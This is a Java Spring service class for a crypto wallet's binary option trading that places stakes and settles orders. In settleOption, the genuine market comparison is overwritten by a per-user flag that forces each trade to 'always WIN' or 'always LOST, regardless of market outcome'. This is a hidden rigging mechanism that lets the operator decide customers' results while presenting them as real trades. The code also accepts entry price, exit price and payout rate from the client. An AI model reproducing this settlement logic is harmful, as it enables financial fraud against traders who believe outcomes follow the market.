package com.crypto.crypto_wallet.serviceImpl;

import com.crypto.crypto_wallet.dto.BinaryOptionRequest;
import com.crypto.crypto_wallet.dto.BinaryOptionResponse;
import com.crypto.crypto_wallet.entity.BinaryOptionOrder;
import com.crypto.crypto_wallet.entity.User;
import com.crypto.crypto_wallet.entity.Wallet;
import com.crypto.crypto_wallet.exception.BadRequestException;
import com.crypto.crypto_wallet.exception.InsufficientBalanceException;
import com.crypto.crypto_wallet.exception.ResourceNotFoundException;
import com.crypto.crypto_wallet.repository.BinaryOptionRepository;
import com.crypto.crypto_wallet.repository.UserRepository;
import com.crypto.crypto_wallet.repository.WalletRepository;
import com.crypto.crypto_wallet.service.BinaryOptionService;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.math.BigDecimal;
import java.math.RoundingMode;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.util.List;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class BinaryOptionServiceImpl implements BinaryOptionService {

    private final BinaryOptionRepository binaryOptionRepository;
    private final WalletRepository walletRepository;
    private final UserRepository userRepository;

    @Override
    @Transactional
    public BinaryOptionResponse placeOption(Long userId, BinaryOptionRequest request) {
        // Validate pair
        if (request.getPair() == null || !request.getPair().contains("/")) {
            throw new BadRequestException("Invalid trading pair. Format: BASE/QUOTE (e.g. BTC/USDT)");
        }

        // Validate direction
        String direction = request.getDirection();
        if (!"CALL".equalsIgnoreCase(direction) && !"PUT".equalsIgnoreCase(direction)) {
            throw new BadRequestException("Direction must be CALL or PUT");
        }
        direction = direction.toUpperCase();

        // Validate stake
        if (request.getStake() == null || request.getStake().compareTo(BigDecimal.ONE) < 0) {
            throw new BadRequestException("Minimum stake is $1");
        }

        // Validate expiry
        if (request.getExpirySeconds() == null || request.getExpirySeconds() < 30) {
            throw new BadRequestException("Minimum expiry is 30 seconds");
        }

        // Validate entry price
        if (request.getEntryPrice() == null || request.getEntryPrice().compareTo(BigDecimal.ZERO) <= 0) {
            throw new BadRequestException("Entry price is required");
        }

        // Payout rate (default 85%)
        BigDecimal payoutRate = request.getPayoutRate() != null
                ? request.getPayoutRate()
                : new BigDecimal("0.85");

        // Clamp payout rate between 0.01 and 0.95
        if (payoutRate.compareTo(new BigDecimal("0.01")) < 0) payoutRate = new BigDecimal("0.01");
        if (payoutRate.compareTo(new BigDecimal("0.95")) > 0) payoutRate = new BigDecimal("0.95");

        // Find user
        User user = userRepository.findById(userId)
                .orElseThrow(() -> new ResourceNotFoundException("User not found"));

        // Deduct stake from USDT wallet immediately
        Wallet usdtWallet = walletRepository.findByUserIdAndCoinSymbol(userId, "USDT")
                .orElseThrow(() -> new InsufficientBalanceException("No USDT wallet found. Please deposit first."));

        if (usdtWallet.getBalance().compareTo(request.getStake()) < 0) {
            throw new InsufficientBalanceException("Insufficient USDT balance. Available: "
                    + usdtWallet.getBalance().setScale(2, RoundingMode.HALF_UP));
        }

        usdtWallet.setBalance(usdtWallet.getBalance().subtract(request.getStake()));
        walletRepository.save(usdtWallet);
        walletRepository.flush();

        // Calculate expiry timestamp
        LocalDateTime expiresAt = LocalDateTime.now().plusSeconds(request.getExpirySeconds());

        // Persist the option order
        BinaryOptionOrder order = BinaryOptionOrder.builder()
                .user(user)
                .pair(request.getPair().toUpperCase())
                .direction(direction)
                .stake(request.getStake())
                .entryPrice(request.getEntryPrice())
                .expirySeconds(request.getExpirySeconds())
                .expiresAt(expiresAt)
                .payoutRate(payoutRate)
                .status("PENDING")
                .build();

        binaryOptionRepository.save(order);
        return toResponse(order);
    }

    @Override
    @Transactional
    public BinaryOptionResponse settleOption(Long userId, Long optionId, BigDecimal exitPrice) {
        BinaryOptionOrder order = binaryOptionRepository.findById(optionId)
                .orElseThrow(() -> new ResourceNotFoundException("Binary option not found"));

        if (!order.getUser().getId().equals(userId)) {
            throw new BadRequestException("Option does not belong to this user");
        }

        if (!"PENDING".equals(order.getStatus())) {
            // Already settled — just return current state (idempotent)
            return toResponse(order);
        }

        if (exitPrice == null || exitPrice.compareTo(BigDecimal.ZERO) <= 0) {
            throw new BadRequestException("Exit price is required for settlement");
        }

        // Ensure option has expired before settling (with a 2-second tolerance for lag)
        if (LocalDateTime.now().plusSeconds(2).isBefore(order.getExpiresAt())) {
            throw new BadRequestException("Option has not expired yet");
        }

        // Determine result
        // CALL wins if exit > entry, PUT wins if exit < entry
        int cmp = exitPrice.compareTo(order.getEntryPrice());
        boolean won;
        if ("CALL".equals(order.getDirection())) {
            won = cmp > 0;
        } else {
            won = cmp < 0;
        }

        // ── BINARY OPTION WIN FLAG CHECK ──
        // binaryOptionWinAllowed = true  → always WIN (full payout), regardless of market outcome.
        // binaryOptionWinAllowed = false → always LOST (zero payout), regardless of market outcome.
        // Ties (cmp == 0) follow the same rule — win flag true → full win, false → full loss.
        boolean winAllowed = order.getUser().isBinaryOptionWinAllowed();
        won = winAllowed; // override: true = always win, false = always lose

        order.setExitPrice(exitPrice);
        order.setSettledAt(LocalDateTime.now());

        if (won) {
            order.setStatus("WON");
            // Payout = stake * (1 + payoutRate)
            BigDecimal payout = order.getStake()
                    .multiply(BigDecimal.ONE.add(order.getPayoutRate()))
                    .setScale(8, RoundingMode.HALF_UP);
            order.setPayout(payout);

            // Credit payout to USDT wallet
            Wallet usdtWallet = walletRepository.findByUserIdAndCoinSymbol(userId, "USDT")
                    .orElseGet(() -> {
                        User user = order.getUser();
                        Wallet w = Wallet.builder().user(user).coinSymbol("USDT").build();
                        return walletRepository.save(w);
                    });
            usdtWallet.setBalance(usdtWallet.getBalance().add(payout));
            walletRepository.save(usdtWallet);
        } else {
            order.setStatus("LOST");
            order.setPayout(BigDecimal.ZERO);
        }

        binaryOptionRepository.save(order);
        return toResponse(order);
    }

    @Override
    public List<BinaryOptionResponse> getHistory(Long userId) {
        return binaryOptionRepository.findByUserIdOrderByCreatedAtDesc(userId)
                .stream().map(this::toResponse).collect(Collectors.toList());
    }

    private BinaryOptionResponse toResponse(BinaryOptionOrder o) {
        BigDecimal profit = null;
        if (o.getPayout() != null) {
            profit = o.getPayout().subtract(o.getStake());
        }
        return BinaryOptionResponse.builder()
                .id(o.getId())
                .pair(o.getPair())
                .direction(o.getDirection())
                .stake(o.getStake())
                .entryPrice(o.getEntryPrice())
                .exitPrice(o.getExitPrice())
                .payoutRate(o.getPayoutRate())
                .payout(o.getPayout())
                .profit(profit)
                .status(o.getStatus())
                .expirySeconds(o.getExpirySeconds())
                .expiresAt(toZonedDateTime(o.getExpiresAt()))
                .createdAt(toZonedDateTime(o.getCreatedAt()))
                .settledAt(toZonedDateTime(o.getSettledAt()))
                .build();
    }

    private ZonedDateTime toZonedDateTime(LocalDateTime ldt) {
        if (ldt == null) return null;
        return ldt.atZone(ZoneId.systemDefault());
    }
}
